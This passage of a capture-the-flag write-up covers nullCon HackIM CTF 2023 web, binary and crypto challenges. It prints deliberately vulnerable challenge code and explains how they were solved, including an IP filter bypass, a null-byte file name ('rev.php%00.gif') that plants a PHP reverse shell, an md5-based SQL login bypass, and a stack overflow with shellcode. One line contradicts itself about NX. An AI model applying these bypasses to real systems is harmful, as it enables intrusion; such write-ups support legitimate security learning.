{\n        if(!preg_match('/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/', $ip)) {\n            return true;\n        }\n        $frontend = gethostbyname(gethostname());\n        $backend = gethostbyname(\"ipfilter_backend\");\n        $subnet = long2ip(ip2long($frontend) &amp; ip2long(\"255.255.255.0\"));\n        $bcast = long2ip(ip2long($frontend) | ~ip2long(\"255.255.255.0\"));\n\n        if(isset($_GET['debug_filter'])) {\n            // Debugging echos that also print the backend local IP\n        }\n\n        if(inet_pton($ip) &lt; (int) inet_pton($subnet)) {\n            return true;\n        }\n        if(! (inet_pton($ip) &lt; inet_pton($bcast))) {\n            return true;\n        }\n        if($ip == $backend) {\n            return true;\n        }\n        return false;\n    }\n    if(isset($_GET['fetch_backend']) ) {\n        echo fetch_backend($_GET['bip']);\n    }\n?&gt;\n</code></pre> Apparently, there don't seem to be any specific bypasses to perform. However, by analyzing each PHP function used in the program one by one, I discovered that <code>inet_pton</code> is vulnerable because it also accepts IPv4 addresses containing zeros in the last subset. For example: <code>xxx.xxx.x.00x</code>. In this way, I can fit the backend's IP address within the subnet range by passing it the same IP printed by the debug, with trailing zeros. For instance, <code>192.168.1.2</code> =&gt; <code>192.168.1.002</code>.</p>"},{"location":"nullCon-HackIM-CTF-2023/#magic-cars","title":"Magic Cars","text":"<p>This challenge required uploading a <code>GIF</code> file to the website's backend in order to later be able to view it. Here's the PHP code for the backend of the website: <pre><code>&lt;?php\n$files = $_FILES[\"fileToUpload\"];\n$uploadOk = true;\nif($files[\"name\"] != \"\"){\n    $target_dir = urldecode(\"images/\" . $files[\"name\"]);\n    if(strpos($target_dir,\"..\") !== false){\n        $uploadOk = false;\n    }\n    if(filesize($files[\"tmp_name\"]) &gt; 1*1000){\n        $uploadOk = false;\n        echo \"too big!!!\";\n    }\n    $extension = strtolower(pathinfo($target_dir,PATHINFO_EXTENSION));\n    $finfo = finfo_open(FILEINFO_MIME_TYPE);\n    $type = finfo_file($finfo,$files[\"tmp_name\"]);\n    finfo_close($finfo);\n    if($extension != \"gif\" || strpos($type,\"image/gif\") === false){\n        echo \" Sorry, only gif files are accepted\";\n        $uploadOk = false;\n    }\n    $target_dir = strtok($target_dir,chr(0));\n    if($uploadOk &amp;&amp; move_uploaded_file($files[\"tmp_name\"],$target_dir)){\n        echo \"&lt;a href='$target_dir'&gt;uploaded gif here go see it!&lt;/a&gt;\";\n    }\n}\n?&gt;\n</code></pre> After a few attempts, I noticed that the backend was checking certain parameters of the file, such as not being too memory-intensive, not having a traversal path in its name, having a <code>.gif</code> extension, and having the correct magic numbers for a valid <code>GIF</code> file. I also observed how it used <code>strtok()</code> between the file name and a null byte, taking the first part of the string as the actual file name. Following this observation, I was able to write a PHP reverse shell (which is in my GitHub repository) named <code>rev.php%00.gif</code>. This file name successfully bypassed all the checks, and after the function execution, the actual file name would become <code>rev.php</code>. As soon as I opened the file at the URL <code>images/rev.php</code>, I could execute commands in the shell as <code>www-data</code><sup>1</sup>.</p>"},{"location":"nullCon-HackIM-CTF-2023/#loginbytepass","title":"Loginbytepass","text":"<p>Loginbytes provided the opportunity to attempt logging in with the username <code>admin</code> or <code>flag</code>. In this case, the username was injected into the database query without any sanitization, while for the password it was double-hashed using md5 without being converted into a hexadecimal string.</p> <p>At this point, looking at this portion of the code: <pre><code>&lt;?php\nfunction check_auth($username, $password)\n{\n    global $db;\n    $username = mysqli_real_escape_string($db, $username); // preventSQLinjection\n    $password = md5(md5($password, true), true);\n    $res = mysqli_query($db, \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\");\n    if (isset($res) &amp;&amp; $res-&gt;fetch_object()) {\n        return true;\n    }\n    return false;\n}\n?&gt;\n</code></pre> My team and I managed to discover that by finding a hash containing the substring <code>first_part_of_hash'='second_part_of_hash</code>, we could bypass the login. This was because PHP transformed both the first and second parts of the hash into <code>0</code>, performed the comparison, and resulted in a query like this: <pre><code>SELECT * FROM users WHERE username='admin' AND true\n</code></pre> This allowed us to obtain the flag.</p>"},{"location":"nullCon-HackIM-CTF-2023/#binary","title":"Binary","text":""},{"location":"nullCon-HackIM-CTF-2023/#babypwn","title":"Babypwn","text":"<p>Finally, a bit of pwn. This challenge included an <code>ELF</code> file as an attachment. Running <code>checksec</code> to examine it yielded the following responses: <pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre> At this point, it's enough to examine it with IDA, where you have a buffer of <code>512</code> characters available and a read function that reads <code>1024</code> characters.  <pre><code>...\n   char username[512];\n\n   printf(\"You shell play a game against @gehaxelt! Win it to get ./flag.txt!\\n\");\n   printf(\"Your game slot is at: %p\\n\", username);\n   printf(\"What's your name?\\n\");\n   read(1, username, 1024);\n...\n</code></pre> This allows us to perform a <code>buffer overflow</code>. We can fill the buffer with a shellcode at the beginning, followed by multiple 'a' characters to fill the remaining space in the buffer. Once the buffer is filled, we just need to overwrite the <code>RBP</code> register and then the <code>return pointer</code> with the address of the shellcode. This way, we can execute a shell on the remote machine<sup>2</sup>.</p>"},{"location":"nullCon-HackIM-CTF-2023/#heavens-flow","title":"Heavens Flow","text":"<p>This challenge is very similar to the previous one, but this time we don't have <code>NX enabled</code>, so we can't use a shellcode on the stack since it's not executable. However, we can still overwrite the <code>return pointer</code> to execute the <code>heavens_secret</code> function, which will allow us to read the flag.</p>"},{"location":"nullCon-HackIM-CTF-2023/#cryptography","title":"Cryptography","text":""},{"location":"nullCon-HackIM-CTF-2023/#euclidean-rsa","title":"Euclidean RSA","text":"<p>This is the first cryptography challenge. The code itself is not very lengthy, but its functionality is quite \"uncommon\" as it utilizes an external function to generate four integers a, b, c, and d, which have a relationship with n: <code>a^2 + b^2 = n</code>, <code>c^2 + d^2 = n</code> <pre><code>while True:\n    try:\n        key = RSA.generate(2048)\n        a,b,c,d = magic(key)\n        break\n    except:\n        pass\nassert a**2 + b**2 == key.n\nassert c**2 + d**2 == key.n\n</code></pre> At this point, by using the <code>Brahmagupta\u2013Fibonacci</code> method, you can solve the equation following these steps:</p> \\[ \\begin{align*} &amp; a^2 + b^2 = c^2 + d^2 = n \\\\ &amp; (a^2 + b^2)(c^2 + d^2) = n^2 = (pq)^2 \\\\ &amp; (ac + bd)^2 + (ad - bc)^2 = p^2 q^2 \\\\ &amp; q^2 = s^2 + t^2 \\\\ &amp; (ac + bd)^2 + (ad - bc)^2 = (p \\cdot s)^2 + (p \\cdot t)^2 \\\\ &amp; ps = a \\cdot c + b \\cdot d \\\\ &amp; pt = a \\cdot d - b \\cdot c \\\\ &amp; p = \\text{gcd}(ps, pt) \\\\ &amp; q = \\frac{n}{p} \\\\ \\end{align*} \\]"},{"location":"nullCon-HackIM-CTF-2023/#sebastians-secret-sharing","title":"Sebastian's Secret Sharing","text":"<p>In this challenge, the source code goes through many steps to make the code's understanding difficult. However, by looking at how it initializes the array containing the flag, something can be noticed: <pre><code>def _a(self):\n    c = [self.s]\n    for i in range(self.t-1):\n        a = Decimal(random.randint(self.s+1, self.s*2))\n        c.append(a)\n    return c\n</code></pre> In this case, <code>self.s</code> represents the flag, and we can observe that it is located at position <code>0</code> within the array when it is returned to the caller. Continuing to analyze the main function, the challenge allows us to read an element at position <code>x mod n</code>, where x is the input we provide and must be within the range <code>1 &lt;= x &lt;= n</code>. Now, if we want to retrieve the value at position 0, we just need to send the service an input of <code>x = n</code>, so that <code>x mod n = 0</code>.</p>"},{"location":"nullCon-HackIM-CTF-2023/#counting","title":"Counting","text":"<p>Finally, this is the last challenge that my team solved. In this challenge, the service was encrypting messages using <code>RSA</code> with very minor differences (practically one bit) using the following code: <pre><code>...\n    message = b'So far we had %03d failed attempts to find the token %s' % (counter, token)\n    print(pow(bytes_to_long(message), key.e, key.n))\n...\n</code></pre> In this case, you can attempt a Franklin\u2013Reiter attack by brute-forcing the changed bit until the decrypted message from the attack contains the token you need to find. Once you've obtained the token, you can send it to the service to get the flag.</p> <ol> <li> <p>The flag is in the path ../flag.flag (which is the root directory of the challenge's website).\u00a0\u21a9</p> </li> <li> <p>It didn't work locally for me. I had to test it blindly on the remote machine.\u00a0\u21a9</p> </li> </ol>"}]}